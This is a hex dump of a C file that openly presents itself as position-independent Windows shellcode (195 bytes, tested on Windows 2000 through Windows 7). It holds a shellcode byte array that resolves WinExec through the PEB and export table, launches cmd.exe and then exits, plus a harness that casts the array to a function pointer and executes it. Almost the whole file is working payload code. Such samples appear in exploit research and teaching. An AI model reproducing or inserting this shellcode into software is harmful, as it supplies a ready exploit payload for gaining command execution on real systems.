00000000  2f 2a 0d 0a 54 69 74 6c  65 3a 20 41 6c 6c 77 69  |/*..Title: Allwi|
00000010  6e 20 57 69 6e 45 78 65  63 20 63 6d 64 2e 65 78  |n WinExec cmd.ex|
00000020  65 20 2b 20 45 78 69 74  50 72 6f 63 65 73 73 20  |e + ExitProcess |
00000030  53 68 65 6c 6c 63 6f 64  65 20 2d 20 31 39 35 20  |Shellcode - 195 |
00000040  62 79 74 65 73 0d 0a 44  61 74 65 3a 20 32 30 31  |bytes..Date: 201|
00000050  30 2d 30 36 2d 32 35 0d  0a 41 75 74 68 6f 72 3a  |0-06-25..Author:|
00000060  20 52 75 62 62 65 72 44  75 63 6b 0d 0a 57 65 62  | RubberDuck..Web|
00000070  3a 20 68 74 74 70 3a 2f  2f 62 66 6c 6f 77 2e 73  |: http://bflow.s|
00000080  65 63 75 72 69 74 79 2d  70 6f 72 74 61 6c 2e 63  |ecurity-portal.c|
00000090  7a 0d 0a 54 65 73 74 65  64 20 6f 6e 3a 20 57 69  |z..Tested on: Wi|
000000a0  6e 20 32 6b 2c 20 57 69  6e 20 32 30 30 33 2c 20  |n 2k, Win 2003, |
000000b0  57 69 6e 20 58 50 20 48  6f 6d 65 20 53 50 32 2f  |Win XP Home SP2/|
000000c0  53 50 33 20 43 5a 2f 45  4e 47 20 28 33 32 29 2c  |SP3 CZ/ENG (32),|
000000d0  20 57 69 6e 20 56 69 73  74 61 20 28 33 32 29 2f  | Win Vista (32)/|
000000e0  28 36 34 29 2c 20 57 69  6e 20 37 20 28 33 32 29  |(64), Win 7 (32)|
000000f0  2f 28 36 34 29 2c 20 57  69 6e 20 32 6b 38 20 28  |/(64), Win 2k8 (|
00000100  33 32 29 0d 0a 54 68 61  6e 6b 73 20 74 6f 3a 20  |32)..Thanks to: |
00000110  6b 65 72 6e 65 6c 68 75  6e 74 65 72 2c 20 4c 6f  |kernelhunter, Lo|
00000120  64 75 73 2c 20 56 72 74  75 6c 65 20 61 6e 64 20  |dus, Vrtule and |
00000130  6f 74 68 65 72 73 0d 0a  2a 2f 0d 0a 20 0d 0a 23  |others..*/.. ..#|
00000140  69 6e 63 6c 75 64 65 20  3c 73 74 64 69 6f 2e 68  |include <stdio.h|
00000150  3e 0d 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 72  |>..#include <str|
00000160  69 6e 67 2e 68 3e 0d 0a  23 69 6e 63 6c 75 64 65  |ing.h>..#include|
00000170  20 3c 73 74 64 6c 69 62  2e 68 3e 0d 0a 20 0d 0a  | <stdlib.h>.. ..|
00000180  69 6e 74 20 6d 61 69 6e  28 29 7b 0d 0a 20 20 20  |int main(){..   |
00000190  20 75 6e 73 69 67 6e 65  64 20 63 68 61 72 20 73  | unsigned char s|
000001a0  68 65 6c 6c 63 6f 64 65  5b 5d 3d 0d 0a 20 20 20  |hellcode[]=..   |
000001b0  20 22 5c 78 46 43 5c 78  33 33 5c 78 44 32 5c 78  | "\xFC\x33\xD2\x|
000001c0  42 32 5c 78 33 30 5c 78  36 34 5c 78 46 46 5c 78  |B2\x30\x64\xFF\x|
000001d0  33 32 5c 78 35 41 5c 78  38 42 22 0d 0a 20 20 20  |32\x5A\x8B"..   |
000001e0  20 22 5c 78 35 32 5c 78  30 43 5c 78 38 42 5c 78  | "\x52\x0C\x8B\x|
000001f0  35 32 5c 78 31 34 5c 78  38 42 5c 78 37 32 5c 78  |52\x14\x8B\x72\x|
00000200  32 38 5c 78 33 33 5c 78  43 39 22 0d 0a 20 20 20  |28\x33\xC9"..   |
00000210  20 22 5c 78 42 31 5c 78  31 38 5c 78 33 33 5c 78  | "\xB1\x18\x33\x|
00000220  46 46 5c 78 33 33 5c 78  43 30 5c 78 41 43 5c 78  |FF\x33\xC0\xAC\x|
00000230  33 43 5c 78 36 31 5c 78  37 43 22 0d 0a 20 20 20  |3C\x61\x7C"..   |
00000240  20 22 5c 78 30 32 5c 78  32 43 5c 78 32 30 5c 78  | "\x02\x2C\x20\x|
00000250  43 31 5c 78 43 46 5c 78  30 44 5c 78 30 33 5c 78  |C1\xCF\x0D\x03\x|
00000260  46 38 5c 78 45 32 5c 78  46 30 22 0d 0a 20 20 20  |F8\xE2\xF0"..   |
00000270  20 22 5c 78 38 31 5c 78  46 46 5c 78 35 42 5c 78  | "\x81\xFF\x5B\x|
00000280  42 43 5c 78 34 41 5c 78  36 41 5c 78 38 42 5c 78  |BC\x4A\x6A\x8B\x|
00000290  35 41 5c 78 31 30 5c 78  38 42 22 0d 0a 20 20 20  |5A\x10\x8B"..   |
000002a0  20 22 5c 78 31 32 5c 78  37 35 5c 78 44 41 5c 78  | "\x12\x75\xDA\x|
000002b0  38 42 5c 78 35 33 5c 78  33 43 5c 78 30 33 5c 78  |8B\x53\x3C\x03\x|
000002c0  44 33 5c 78 46 46 5c 78  37 32 22 0d 0a 20 20 20  |D3\xFF\x72"..   |
000002d0  20 22 5c 78 33 34 5c 78  38 42 5c 78 35 32 5c 78  | "\x34\x8B\x52\x|
000002e0  37 38 5c 78 30 33 5c 78  44 33 5c 78 38 42 5c 78  |78\x03\xD3\x8B\x|
000002f0  37 32 5c 78 32 30 5c 78  30 33 22 0d 0a 20 20 20  |72\x20\x03"..   |
00000300  20 22 5c 78 46 33 5c 78  33 33 5c 78 43 39 5c 78  | "\xF3\x33\xC9\x|
00000310  34 31 5c 78 41 44 5c 78  30 33 5c 78 43 33 5c 78  |41\xAD\x03\xC3\x|
00000320  38 31 5c 78 33 38 5c 78  34 37 22 0d 0a 20 20 20  |81\x38\x47"..   |
00000330  20 22 5c 78 36 35 5c 78  37 34 5c 78 35 30 5c 78  | "\x65\x74\x50\x|
00000340  37 35 5c 78 46 34 5c 78  38 31 5c 78 37 38 5c 78  |75\xF4\x81\x78\x|
00000350  30 34 5c 78 37 32 5c 78  36 46 22 0d 0a 20 20 20  |04\x72\x6F"..   |
00000360  20 22 5c 78 36 33 5c 78  34 31 5c 78 37 35 5c 78  | "\x63\x41\x75\x|
00000370  45 42 5c 78 38 31 5c 78  37 38 5c 78 30 38 5c 78  |EB\x81\x78\x08\x|
00000380  36 34 5c 78 36 34 5c 78  37 32 22 0d 0a 20 20 20  |64\x64\x72"..   |
00000390  20 22 5c 78 36 35 5c 78  37 35 5c 78 45 32 5c 78  | "\x65\x75\xE2\x|
000003a0  34 39 5c 78 38 42 5c 78  37 32 5c 78 32 34 5c 78  |49\x8B\x72\x24\x|
000003b0  30 33 5c 78 46 33 5c 78  36 36 22 0d 0a 20 20 20  |03\xF3\x66"..   |
000003c0  20 22 5c 78 38 42 5c 78  30 43 5c 78 34 45 5c 78  | "\x8B\x0C\x4E\x|
000003d0  38 42 5c 78 37 32 5c 78  31 43 5c 78 30 33 5c 78  |8B\x72\x1C\x03\x|
000003e0  46 33 5c 78 38 42 5c 78  31 34 22 0d 0a 20 20 20  |F3\x8B\x14"..   |
000003f0  20 22 5c 78 38 45 5c 78  30 33 5c 78 44 33 5c 78  | "\x8E\x03\xD3\x|
00000400  35 32 5c 78 36 38 5c 78  37 38 5c 78 36 35 5c 78  |52\x68\x78\x65\x|
00000410  36 33 5c 78 30 31 5c 78  46 45 22 0d 0a 20 20 20  |63\x01\xFE"..   |
00000420  20 22 5c 78 34 43 5c 78  32 34 5c 78 30 33 5c 78  | "\x4C\x24\x03\x|
00000430  36 38 5c 78 35 37 5c 78  36 39 5c 78 36 45 5c 78  |68\x57\x69\x6E\x|
00000440  34 35 5c 78 35 34 5c 78  35 33 22 0d 0a 20 20 20  |45\x54\x53"..   |
00000450  20 22 5c 78 46 46 5c 78  44 32 5c 78 36 38 5c 78  | "\xFF\xD2\x68\x|
00000460  36 33 5c 78 36 44 5c 78  36 34 5c 78 30 31 5c 78  |63\x6D\x64\x01\x|
00000470  46 45 5c 78 34 43 5c 78  32 34 22 0d 0a 20 20 20  |FE\x4C\x24"..   |
00000480  20 22 5c 78 30 33 5c 78  36 41 5c 78 30 35 5c 78  | "\x03\x6A\x05\x|
00000490  33 33 5c 78 43 39 5c 78  38 44 5c 78 34 43 5c 78  |33\xC9\x8D\x4C\x|
000004a0  32 34 5c 78 30 34 5c 78  35 31 22 0d 0a 20 20 20  |24\x04\x51"..   |
000004b0  20 22 5c 78 46 46 5c 78  44 30 5c 78 36 38 5c 78  | "\xFF\xD0\x68\x|
000004c0  36 35 5c 78 37 33 5c 78  37 33 5c 78 30 31 5c 78  |65\x73\x73\x01\x|
000004d0  38 42 5c 78 44 46 5c 78  46 45 22 0d 0a 20 20 20  |8B\xDF\xFE"..   |
000004e0  20 22 5c 78 34 43 5c 78  32 34 5c 78 30 33 5c 78  | "\x4C\x24\x03\x|
000004f0  36 38 5c 78 35 30 5c 78  37 32 5c 78 36 46 5c 78  |68\x50\x72\x6F\x|
00000500  36 33 5c 78 36 38 5c 78  34 35 22 0d 0a 20 20 20  |63\x68\x45"..   |
00000510  20 22 5c 78 37 38 5c 78  36 39 5c 78 37 34 5c 78  | "\x78\x69\x74\x|
00000520  35 34 5c 78 46 46 5c 78  37 34 5c 78 32 34 5c 78  |54\xFF\x74\x24\x|
00000530  32 30 5c 78 46 46 5c 78  35 34 22 0d 0a 20 20 20  |20\xFF\x54"..   |
00000540  20 22 5c 78 32 34 5c 78  32 30 5c 78 35 37 5c 78  | "\x24\x20\x57\x|
00000550  46 46 5c 78 44 30 22 3b  0d 0a 20 0d 0a 20 20 20  |FF\xD0";.. ..   |
00000560  20 70 72 69 6e 74 66 28  22 53 69 7a 65 20 3d 20  | printf("Size = |
00000570  25 64 5c 6e 22 2c 20 73  74 72 6c 65 6e 28 73 68  |%d\n", strlen(sh|
00000580  65 6c 6c 63 6f 64 65 29  29 3b 0d 0a 20 0d 0a 20  |ellcode));.. .. |
00000590  20 20 20 73 79 73 74 65  6d 28 22 50 41 55 53 45  |   system("PAUSE|
000005a0  22 29 3b 0d 0a 20 0d 0a  20 20 20 20 28 28 76 6f  |");.. ..    ((vo|
000005b0  69 64 20 28 2a 29 28 29  29 73 68 65 6c 6c 63 6f  |id (*)())shellco|
000005c0  64 65 29 28 29 3b 0d 0a  20 0d 0a 20 20 20 20 72  |de)();.. ..    r|
000005d0  65 74 75 72 6e 20 30 3b  0d 0a 7d                 |eturn 0;..}|
000005db
